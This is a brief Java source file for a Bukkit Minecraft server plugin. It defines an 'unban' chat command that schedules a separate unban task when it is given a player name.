package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Command_UNBAN2 extends CommandBase {

    public Command_UNBAN2() {
        super("unban", "<Spieler>" + " §d| " + ChatColor.GRAY + "Entsperren", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_UNBAN(this, args));
            } catch (Exception ignored) {
            }
        }
    }

}
